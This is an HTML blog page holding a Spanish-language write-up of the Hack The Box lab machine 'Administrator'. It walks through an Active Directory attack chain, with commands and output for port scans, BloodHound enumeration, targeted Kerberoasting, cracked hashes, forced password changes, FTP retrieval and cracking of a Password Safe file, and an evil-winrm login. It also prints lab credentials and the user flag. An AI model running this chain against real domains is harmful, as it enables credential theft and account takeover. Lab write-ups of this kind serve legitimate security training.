@@ -1,0 +1,705 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Administrator | My New Hugo Site</title>
+<meta name="keywords" content="Fluffy, Easy, ActiveDirectory, ESC16">
+<meta name="description" content="Writeups sobre la máquina Administrator en Active Directory de dificultad Media. Enumerando con bloodhound encontraremos un path claro que seguir para ir moviendonos entre usuarios, llegado cierto momento obtendremos un archivo con credenciales a través de FTP con el cual obtendremos el usuario que contiene la user flag. Para completar la escalada de privilegios volveremos a abusar de permisos GenericAll para realizar un kerberoast attack sobre el usuario ethan, luego abusando de permisos GetChangesAll y GetChanges realizaremos un DCSync attack para convertirnos en domain admin.">
+<meta name="author" content="Borhub">
+<link rel="canonical" href="https://borhuub.github.io/writeups/administrator/administrator/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="icon" type="image/png" sizes="16x16" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="icon" type="image/png" sizes="32x32" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="apple-touch-icon" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="mask-icon" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://borhuub.github.io/writeups/administrator/administrator/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://borhuub.github.io/writeups/administrator/administrator/">
+  <meta property="og:site_name" content="My New Hugo Site">
+  <meta property="og:title" content="Administrator">
+  <meta property="og:description" content="Writeups sobre la máquina Administrator en Active Directory de dificultad Media. Enumerando con bloodhound encontraremos un path claro que seguir para ir moviendonos entre usuarios, llegado cierto momento obtendremos un archivo con credenciales a través de FTP con el cual obtendremos el usuario que contiene la user flag. Para completar la escalada de privilegios volveremos a abusar de permisos GenericAll para realizar un kerberoast attack sobre el usuario ethan, luego abusando de permisos GetChangesAll y GetChanges realizaremos un DCSync attack para convertirnos en domain admin.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:tag" content="Fluffy">
+    <meta property="article:tag" content="Easy">
+    <meta property="article:tag" content="ActiveDirectory">
+    <meta property="article:tag" content="ESC16">
+    <meta property="og:image" content="https://borhuub.github.io/static/logo_machines/administrator.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://borhuub.github.io/static/logo_machines/administrator.png">
+<meta name="twitter:title" content="Administrator">
+<meta name="twitter:description" content="Writeups sobre la máquina Administrator en Active Directory de dificultad Media. Enumerando con bloodhound encontraremos un path claro que seguir para ir moviendonos entre usuarios, llegado cierto momento obtendremos un archivo con credenciales a través de FTP con el cual obtendremos el usuario que contiene la user flag. Para completar la escalada de privilegios volveremos a abusar de permisos GenericAll para realizar un kerberoast attack sobre el usuario ethan, luego abusando de permisos GetChangesAll y GetChanges realizaremos un DCSync attack para convertirnos en domain admin.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Writeups",
+      "item": "https://borhuub.github.io/writeups/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Administrator",
+      "item": "https://borhuub.github.io/writeups/administrator/administrator/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Administrator",
+  "name": "Administrator",
+  "description": "Writeups sobre la máquina Administrator en Active Directory de dificultad Media. Enumerando con bloodhound encontraremos un path claro que seguir para ir moviendonos entre usuarios, llegado cierto momento obtendremos un archivo con credenciales a través de FTP con el cual obtendremos el usuario que contiene la user flag. Para completar la escalada de privilegios volveremos a abusar de permisos GenericAll para realizar un kerberoast attack sobre el usuario ethan, luego abusando de permisos GetChangesAll y GetChanges realizaremos un DCSync attack para convertirnos en domain admin.",
+  "keywords": [
+    "Fluffy", "Easy", "ActiveDirectory", "ESC16"
+  ],
+  "articleBody": "\nAs is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: Olivia Password: ichliebedich\nReconocimiento Escaneo de puertos abiertos:\n❯ sudo nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.10.11.42 -oG ports Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7.97 ( https://nmap.org ) at 2025-06-30 11:49 +0200 Initiating SYN Stealth Scan at 11:49 Scanning 10.10.11.42 [65535 ports] Discovered open port 139/tcp on 10.10.11.42 Increasing send delay for 10.10.11.42 from 0 to 5 due to 158 out of 526 dropped probes since last increase. Discovered open port 21/tcp on 10.10.11.42 Discovered open port 445/tcp on 10.10.11.42 Discovered open port 53/tcp on 10.10.11.42 Discovered open port 135/tcp on 10.10.11.42 Discovered open port 49667/tcp on 10.10.11.42 Discovered open port 50958/tcp on 10.10.11.42 Discovered open port 3269/tcp on 10.10.11.42 Discovered open port 49665/tcp on 10.10.11.42 Discovered open port 9389/tcp on 10.10.11.42 Discovered open port 5985/tcp on 10.10.11.42 Discovered open port 636/tcp on 10.10.11.42 Discovered open port 61600/tcp on 10.10.11.42 Discovered open port 50963/tcp on 10.10.11.42 Discovered open port 50985/tcp on 10.10.11.42 Discovered open port 49664/tcp on 10.10.11.42 Increasing send delay for 10.10.11.42 from 5 to 10 due to max_successful_tryno increase to 4 Increasing send delay for 10.10.11.42 from 10 to 20 due to max_successful_tryno increase to 5 Increasing send delay for 10.10.11.42 from 20 to 40 due to 87 out of 289 dropped probes since last increase. Increasing send delay for 10.10.11.42 from 40 to 80 due to max_successful_tryno increase to 6 Discovered open port 49668/tcp on 10.10.11.42 Discovered open port 389/tcp on 10.10.11.42 Discovered open port 88/tcp on 10.10.11.42 Discovered open port 3268/tcp on 10.10.11.42 Discovered open port 50947/tcp on 10.10.11.42 Discovered open port 49666/tcp on 10.10.11.42 Discovered open port 593/tcp on 10.10.11.42 Discovered open port 464/tcp on 10.10.11.42 Discovered open port 47001/tcp on 10.10.11.42 Discovered open port 50966/tcp on 10.10.11.42 Completed SYN Stealth Scan at 11:50, 15.13s elapsed (65535 total ports) Nmap scan report for 10.10.11.42 Host is up, received user-set (0.045s latency). Scanned at 2025-06-30 11:49:53 CEST for 15s Not shown: 65509 closed tcp ports (reset) PORT STATE SERVICE REASON 21/tcp open ftp syn-ack ttl 127 53/tcp open domain syn-ack ttl 127 88/tcp open kerberos-sec syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 389/tcp open ldap syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 464/tcp open kpasswd5 syn-ack ttl 127 593/tcp open http-rpc-epmap syn-ack ttl 127 636/tcp open ldapssl syn-ack ttl 127 3268/tcp open globalcatLDAP syn-ack ttl 127 3269/tcp open globalcatLDAPssl syn-ack ttl 127 5985/tcp open wsman syn-ack ttl 127 9389/tcp open adws syn-ack ttl 127 47001/tcp open winrm syn-ack ttl 127 49664/tcp open unknown syn-ack ttl 127 49665/tcp open unknown syn-ack ttl 127 49666/tcp open unknown syn-ack ttl 127 49667/tcp open unknown syn-ack ttl 127 49668/tcp open unknown syn-ack ttl 127 50947/tcp open unknown syn-ack ttl 127 50958/tcp open unknown syn-ack ttl 127 50963/tcp open unknown syn-ack ttl 127 50966/tcp open unknown syn-ack ttl 127 50985/tcp open unknown syn-ack ttl 127 61600/tcp open unknown syn-ack ttl 127 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 15.18 seconds Raw packets sent: 73737 (3.244MB) | Rcvd: 66196 (2.648MB) Escaneo todos los puertos:\n❯ ports.py ports ​ 🔍 Puertos encontrados: ➜ 21 ➜ 53 ➜ 88 ➜ 135 ➜ 139 ➜ 389 ➜ 445 ➜ 464 ➜ 593 ➜ 636 ➜ 3268 ➜ 3269 ➜ 5985 ➜ 9389 ➜ 47001 ➜ 49664 ➜ 49665 ➜ 49666 ➜ 49667 ➜ 49668 ➜ 50947 ➜ 50958 ➜ 50963 ➜ 50966 ➜ 50985 ➜ 61600 ​ ¡Puertos copiados en el portapapeles! Escaneo de servicios:\n❯ sudo nmap -sCV -p 21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49668,50947,50958,50963,50966,50985,61600 -Pn 10.10.11.42 -oN targeted Starting Nmap 7.97 ( https://nmap.org ) at 2025-06-30 11:57 +0200 Nmap scan report for 10.10.11.42 Host is up (0.11s latency). ​ PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-06-30 16:57:08Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 50947/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 50958/tcp open msrpc Microsoft Windows RPC 50963/tcp open msrpc Microsoft Windows RPC 50966/tcp open msrpc Microsoft Windows RPC 50985/tcp open msrpc Microsoft Windows RPC 61600/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows ​ Host script results: | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required | smb2-time: | date: 2025-06-30T16:58:05 |_ start_date: N/A |_clock-skew: 6h59m50s ​ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 75.66 seconds Empezamos enumerando las carpetas compartidas pero no encontramos nada interesante.\n❯ nxc smb 10.10.11.42 -u 'Olivia' -p 'ichliebedich' --shares SMB 10.10.11.42 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) SMB 10.10.11.42 445 DC [+] administrator.htb\\Olivia:ichliebedich SMB 10.10.11.42 445 DC [*] Enumerated shares SMB 10.10.11.42 445 DC Share Permissions Remark SMB 10.10.11.42 445 DC ----- ----------- ------ SMB 10.10.11.42 445 DC ADMIN$ Remote Admin SMB 10.10.11.42 445 DC C$ Default share SMB 10.10.11.42 445 DC IPC$ READ Remote IPC SMB 10.10.11.42 445 DC NETLOGON READ Logon server share SMB 10.10.11.42 445 DC SYSVOL READ Logon serv BloodHound Enumeration Lanzamos el script bloodhound-pyhton y nos ponemos a mirar los permisos que tiene disponible el usuario Olivia.\nEs entonces cuando vemos que tenemos permisos genericAll sobre el usuario Michael.\nKerberoast attack Entonces nos sincronizamos con la hora del dominio y lanzamos el ataque kerberoast para ver si el Key Distribution Center (KDC) nos devuelve el Ticket Garanting Service (TGS).\n❯ sudo ntpdate -u 10.10.11.42 [sudo] contraseña para borhub: 30 Jun 22:24:57 ntpdate[18024]: step time server 10.10.11.42 offset +25191.690143 sec ❯ ./targetedKerberoast.py --dc-ip 10.10.11.42 -d 'ADMINISTRATOR.htb' -u 'Olivia' -p 'ichliebedich' [*] Starting kerberoast attacks [*] Fetching usernames from Active Directory with LDAP [+] Printing hash for (michael) $krb5tgs$23$*michael$ADMINISTRATOR.HTB$ADMINISTRATOR.htb/michael*$b83c2c411adef0b972d360a349a93078$567cd69e9bdedfc998d2261dcfb017076372141f3b53fcfca0b7dfa23f0b7b5039f232a74737ce172fdb1e4d1952e74726694f31760562f5e3d1d0e0808f6da11ae57e876e09dc6518e0dcd35af501b146d43d80adc8c493a1894c0ceb9c84a7ff2fc8b3bbef1070c540175b28e3836d950d39713679dfd7d0f95f3e1a750be697462baaf08aa66470c71a6ea21947a2445d67a838b4feb5da475d21cac896a58c84d04ed8949544a40aa5f13b9dbda6739233a74cb638983b15b2367ef0f71cec6ade9579fa056f9f8aeab82064d86267e6ad14ed9be09ce2bfa4181811b28e8e1277cd08d420a339c19be0476bdf13af159adb136a574dfe781b7b7236f8813f1f58434f507e709bba835b1780b06e4ad9c815c1447f55e0ea280a73a87ab2d280e31af7474eff1bf797147d07487d833526368a3381b3e3af66c43909c2046a1beea875b5e89328dded1bc580885cbdce1714724a4f76b5fcfd8fa0e7eb1a16034177d84943bed7d4297bfbfd9d2ad7814b12dd03241f9bb7514649e0de0ed00cf218d30f958da469eb0770b0e99feaf78b5990eef985eb4e929caad12b682cb0380627434702f165700c994a8cdf77ea614499a3c447898d5964000192a5ac5ad60864f649646b07a2186bef66c525d3ba3ae308172bd01c69f7f7228bb674912a16514fdf9242b7d573de2d9151407259d49cca6fcdcc369a6102cfffec921daa988b7789a3b14f091c3543ce054f13274c7abc85febd52124e9403b8538cdd3b3d10bd5e9f9d008a06260af49af1ddd7425aec410a99c3ff218cfabe9134535440db9d29439766b51ef6eb7dd7cd74e6e7c9f609fc42fab6212c2f41fe4a4e26fb71cf1ecc25b3aacf842acdd40a5b41f3001248dfe721b13d59fd17b14709d1e443d358390d4679e620f0304f757db0e7f2cd80bb570d859ee43921221443c1ce495ef173c663c6a2b620a397072e2882e36558e0e19fdbb19e69e02e588066a185eee7082246122e1d8aea5636049cc23d83cb2ae7167f7e5810fbda1585c1c77db1eafcf46088b03b7b70bcef1f0bf8146fbe3b8a4922f293141c83a990add33b883775e1c4dee2b103cd704b6920eacba3bb3a1d6042385e07632f56167690543ee59b42bc497b6a90574c28b2a323ef99b19516c22ac5d1d31b8a1fa1e15e75558ea3ede543ddc2332acb54dab40c6c09c79480745a04441761780a023bbf29fb3a34ce245eea6405651d64a70e0cbb0ed67c41d8fb9ce796771cee011578d282d254f17175f6965bb0296195ba1598b74ad9317fd8f2bb32a33bce2f718c1e0ef8d802b30ae9167e19209348dca0ed9c783af3e43bdff6498ed24cc621ef7ce6763e29155ee918255896c0f68865320ab62895af2a242338f7bf8ea116f8b29d0d76c482eef440f6500520f57a0d718b82248403e5a727061fa0fd217b7fba426ec01a769dd6fd45abb04016666903ead5d34894a9cff84a27fbac1f92e0a6f02d268a445f03b5ca526402f32104819250c6 Una vez lanzado el ataque vemos que nos devuelve el TGS del usuario michael con lo cual ahora intentamos crackearlo para obtener la contraseña.\n❯ hashcat -m 13100 --force -a 0 kerberohash /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt --force hashcat (v6.2.6) starting ...SNIP... Dictionary cache hit: * Filename..: /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt * Passwords.: 14344384 * Bytes.....: 139921497 * Keyspace..: 14344384 $krb5tgs$23$*michael$ADMINISTRATOR.HTB$ADMINISTRATOR.htb/michael*$b83c2c411adef0b972d360a349a93078$567cd69e9bdedfc998d2261dcfb017076372141f3b53fcfca0b7dfa23f0b7b5039f232a74737ce172fdb1e4d1952e74726694f31760562f5e3d1d0e0808f6da11ae57e876e09dc6518e0dcd35af501b146d43d80adc8c493a1894c0ceb9c84a7ff2fc8b3bbef1070c540175b28e3836d950d39713679dfd7d0f95f3e1a750be697462baaf08aa66470c71a6ea21947a2445d67a838b4feb5da475d21cac896a58c84d04ed8949544a40aa5f13b9dbda6739233a74cb638983b15b2367ef0f71cec6ade9579fa056f9f8aeab82064d86267e6ad14ed9be09ce2bfa4181811b28e8e1277cd08d420a339c19be0476bdf13af159adb136a574dfe781b7b7236f8813f1f58434f507e709bba835b1780b06e4ad9c815c1447f55e0ea280a73a87ab2d280e31af7474eff1bf797147d07487d833526368a3381b3e3af66c43909c2046a1beea875b5e89328dded1bc580885cbdce1714724a4f76b5fcfd8fa0e7eb1a16034177d84943bed7d4297bfbfd9d2ad7814b12dd03241f9bb7514649e0de0ed00cf218d30f958da469eb0770b0e99feaf78b5990eef985eb4e929caad12b682cb0380627434702f165700c994a8cdf77ea614499a3c447898d5964000192a5ac5ad60864f649646b07a2186bef66c525d3ba3ae308172bd01c69f7f7228bb674912a16514fdf9242b7d573de2d9151407259d49cca6fcdcc369a6102cfffec921daa988b7789a3b14f091c3543ce054f13274c7abc85febd52124e9403b8538cdd3b3d10bd5e9f9d008a06260af49af1ddd7425aec410a99c3ff218cfabe9134535440db9d29439766b51ef6eb7dd7cd74e6e7c9f609fc42fab6212c2f41fe4a4e26fb71cf1ecc25b3aacf842acdd40a5b41f3001248dfe721b13d59fd17b14709d1e443d358390d4679e620f0304f757db0e7f2cd80bb570d859ee43921221443c1ce495ef173c663c6a2b620a397072e2882e36558e0e19fdbb19e69e02e588066a185eee7082246122e1d8aea5636049cc23d83cb2ae7167f7e5810fbda1585c1c77db1eafcf46088b03b7b70bcef1f0bf8146fbe3b8a4922f293141c83a990add33b883775e1c4dee2b103cd704b6920eacba3bb3a1d6042385e07632f56167690543ee59b42bc497b6a90574c28b2a323ef99b19516c22ac5d1d31b8a1fa1e15e75558ea3ede543ddc2332acb54dab40c6c09c79480745a04441761780a023bbf29fb3a34ce245eea6405651d64a70e0cbb0ed67c41d8fb9ce796771cee011578d282d254f17175f6965bb0296195ba1598b74ad9317fd8f2bb32a33bce2f718c1e0ef8d802b30ae9167e19209348dca0ed9c783af3e43bdff6498ed24cc621ef7ce6763e29155ee918255896c0f68865320ab62895af2a242338f7bf8ea116f8b29d0d76c482eef440f6500520f57a0d718b82248403e5a727061fa0fd217b7fba426ec01a769dd6fd45abb04016666903ead5d34894a9cff84a27fbac1f92e0a6f02d268a445f03b5ca526402f32104819250c6:password Y comprobamos que las credenciales sean validas con nxc.\n❯ nxc smb 10.10.11.42 -u 'michael' -p 'password' SMB 10.10.11.42 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) SMB 10.10.11.42 445 DC [+] administrator.htb\\michael:password ForceChangePassword - Net rpc Si volvemos a comprobar el bloodhound vemos que michael tiene el permiso ForceChangePassword sobre el usuario Benjamin, es decir, tenemos la capacidad de cambiarle la contraseña.\nLanzamos el comando con net rpc y cambiamos la contraseña a Benjamin a “password”.\n❯ net rpc password \"benjamin\" 'password' -U ADMINISTRATOR.HTB/michael%password -S \"10.10.11.42\" Comprobación de credenciales:\n❯ nxc smb 10.10.11.42 -u 'benjamin' -p 'password' SMB 10.10.11.42 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) SMB 10.10.11.42 445 DC [+] administrator.htb\\benjamin:password Acceso inicial Mirando el bloodhound de benjamin, solo vemos que es miembro del grupo Share Moderators. Esto me puede dar una pista que puede tener permiso en algún tipo de carpeta compartida. Al principio del escaneo habíamos visto que el puerto 21 (ftp) se encontraba abierto, con lo cual, intentamos conectarnos con estas credenciales.\nFTP Enumeration Nos conectamos a el servidor ftp y descubrimos el archivo “Backup.psafe3”.\n❯ ftp 10.10.11.42 Connected to 10.10.11.42. 220 Microsoft FTP Service Name (10.10.11.42:borhub): benjamin 331 Password required Password: 230 User logged in. Remote system type is Windows_NT. ftp\u003e ls 200 PORT command successful. 125 Data connection already open; Transfer starting. 10-05-24 09:13AM 952 Backup.psafe3 226 Transfer complete. ftp\u003e get Backup.psafe3 200 PORT command successful. 150 Opening ASCII mode data connection. WARNING! 3 bare linefeeds received in ASCII mode File may not have transferred correctly. 226 Transfer complete. 952 bytes received in 0,1237 seconds (7,5134 kbytes/s) Vemos que hemos obtenido un archivo .psafe3 que se suele asociar a los archivos que tienen una base de datos de credenciales almacenadas de la aplicación Password Safe. Así que nos instalamos la aplicación Password Safe y intentamos abrir el archivo con ella, pero nos pide una contraseña la cual no tenemos:\nComo no tenemos la contraseña, vamos a intentar sacar el hash con la herramienta psafe2john sacada del John the ripper jumbo.\n❯ ./pwsafe2john.py /home/borhub/Workspace/HTB/Administrator/CONTENT/Backup.psafe3 Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050 Y ahora vamos a crackearlo con jhon.\n❯ john backuphash --wordlist=/usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt Warning: detected hash type \"pwsafe\", but the string is also recognized as \"pwsafe-opencl\" Use the \"--format=pwsafe-opencl\" option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash (pwsafe, Password Safe [SHA256 128/128 AVX 4x]) Cost 1 (iteration count) is 2048 for all loaded hashes Will run 16 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status tekieromucho (Backu) 1g 0:00:00:00 DONE (2025-07-01 00:13) 3.703g/s 30340p/s 30340c/s 30340C/s 123456..total90 Use the \"--show\" option to display all of the cracked passwords reliably Session completed Si vemos la salida que tenemos al listar usuarios vemos que existen los siguientes:\n❯ nxc smb 10.10.11.42 -u 'benjamin' -p 'password' --users SMB 10.10.11.42 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) SMB 10.10.11.42 445 DC [+] administrator.htb\\benjamin:password SMB 10.10.11.42 445 DC -Username- -Last PW Set- -BadPW- -Description- SMB 10.10.11.42 445 DC Administrator 2024-10-22 18:59:36 0 Built-in account for administering the computer/domain SMB 10.10.11.42 445 DC Guest 0 Built-in account for guest access to the computer/domain SMB 10.10.11.42 445 DC krbtgt 2024-10-04 19:53:28 0 Key Distribution Center Service Account SMB 10.10.11.42 445 DC olivia 2024-10-06 01:22:48 0 SMB 10.10.11.42 445 DC michael 2025-06-30 00:11:02 0 SMB 10.10.11.42 445 DC benjamin 2025-06-30 20:45:09 0 SMB 10.10.11.42 445 DC emily 2024-10-30 23:40:02 0 SMB 10.10.11.42 445 DC ethan 2024-10-12 20:52:14 0 SMB 10.10.11.42 445 DC alexander 2024-10-31 00:18:04 0 SMB 10.10.11.42 445 DC emma 2024-10-31 00:18:35 0 SMB 10.10.11.42 445 DC [*] Enumerated 10 local users: ADMINISTRATOR Ahora vamos a copiar los usuarios y las contraseñas obtenidas en Password Safe a los archivos user y password para luego comprobar las credenciales.\n❯ nxc smb 10.10.11.42 -u users -p passwords SMB 10.10.11.42 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) SMB 10.10.11.42 445 DC [+] administrator.htb\\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb Una vez comprobadas las credenciales iniciamos sesión a través de winrm y conseguimos la user flag.\n❯ evil-winrm -i 10.10.11.42 -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' Evil-WinRM shell v3.7 Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\emily\\Documents\u003e type ../Desktop/user.txt 62b2bb880ec2520e82847e082e86e18b Escalada de privilegios Si miramos los permisos ACL que tiene el usuario emily, vemos que tiene permisos GenericWrite sobre el usuario ethan.\nKerberoast attack Volvemos a lanzar el ataque kerberoasting para obtener el Ticket Garanting Service (TGS) cifrado con el hash NTLM/NTHash de la cuenta solicitada.\n❯ ./targetedKerberoast.py --dc-ip 10.10.11.42 -d 'ADMINISTRATOR.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' [*] Starting kerberoast attacks [*] Fetching usernames from Active Directory with LDAP [+] Printing hash for (ethan) $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$ADMINISTRATOR.htb/ethan*$66eaa14ca29fe4fbfadfc7dc81b18730$6b3b78c7fd664d7d39d3bff5567328b10759306a4cf7124e1322e63c4abdfe419bff877d4c7e74eccc542951d18016ca5b0f3ccefddd2bdba597c50b8ff4faf2db3a3d82b7c507564f76c2d26695430ebc6faa36cff5993e9d275068a201c8668436887b8719725535a091fce09ac2ddf028fb093abb3898a6086f229967de5c4a7f5fd20d6035273723d038849da8e3b2bac0372e37472e17604772e498e619e95c4a3d736479d6837762131a2b995f9368fd9ffccc76620b25ad893e9a36e922cff25fe07f56b975a7ca1c38660888e9be0662ced2d9340491383b4cbe0d05c2578b66f3470bd07d4e0de11ff819a2622a6348e7c21b6127c513bdec7fc890b51729aca24195349f06fcf205b71a9d3f074cfa3157f87cf31c070fe44a1abbc1a4ea5a23825437acc30999d5abdfbee0be38ad583526abf44dac8b60a0f48b0ade25abaa906c469ab1f00307b76178dbef0cf767320ba1868c052bb9e318d3cddbea6e4059fd6aaa99600ba6e969ec7144b688963f402793b03118a961627a55fefd040b4e8255347da60787d9b301039fb777746a639808f7627fd23f2ef297c370b7058408abf4e901bef2a1cb4d26ce231a6825400e13e9f34c42dd9b7ee7de233e1f4f97327109ba7f8a5633f40bcaa90e624f5bba2da30f449ee39b29d9de793fbbd7e90ccd10105d3c375b42bab66ff911dbc1c7ecf7c790e865f41b89e2fe87434aefda2a5e5eb93f004ce780384a9706d522be678dcfe5b98e8f4eb33ac12311b017023747f5318dda3a67a04358cccd4d38a554a3d8d09fe380f8535b6bc4e1504bcc3d169837a6fad24ca7b3df9ab8a7d1cbc00877e35da141f24f35a19a1dd1c134b4410964a0ae0c18ad25af5a54a628e18fb3d1ec5da93d6e518a7b09d21e9dc3a3d627b80a39623ad685b2ee90e10fe4c710d4c9d0b0f145ca737ab8527074b8b5ea9cc1fa0b67be253660fab9cd18ccf34c8c14dee30d0b830ea16f2bf314ed44f060a7cf5bd1bf2cf93337f2b8f5d52b6e6fd331d52a7a85626db1d11249e5dadb758c0c8cca517fa5c629678a957f5b29c3ca5f9ee1d93fcf40af608ae7c34a4e3ef3838756b2108c08a7e9689394c781ae3d7f2313261b3f23f1e2d6fd0bec5a40a500952f3b300723c6679648a9b861413c6a4c5f361eb3f9a7d472567f517efe25977ddbc0c9f53d8c2aad0ab7022aa9f31e256ca8bb37a04c00d08e6cd7629a1187e90e9ecbe4e5eb2035f0a8dc87d16d21655e9590784ebc3b8c55dcbcd77b5cd089bc52af5538b067ae3aa3f862128fd17e2e24b497e2da67cad4a6c851f0261a9018858e3ac74f3974008f73301e491b5227e514222fdd43f7ea2938548e593fdd3a17effc62ae7b49066e39f218feb4462e2c0cfbe773f7a477ad9f43b8e80491c861d5c774213dd2d6d5e9766fe2afa21cf7cdafde6727e2ccd43acffa47b822b087dfdcbe11d0bcba892c73fdc2325cf2201101f2e3a85fe5b87b76935eb792631d0b4f5836e9f33c09c36608179ab6c0 Ahora tratamos de crackearlo con hashcat:\n❯ hashcat -m 13100 --force -a 0 kerberohash /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt --force hashcat (v6.2.6) starting ...SNIP... Dictionary cache hit: * Filename..: /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt * Passwords.: 14344384 * Bytes.....: 139921497 * Keyspace..: 14344384 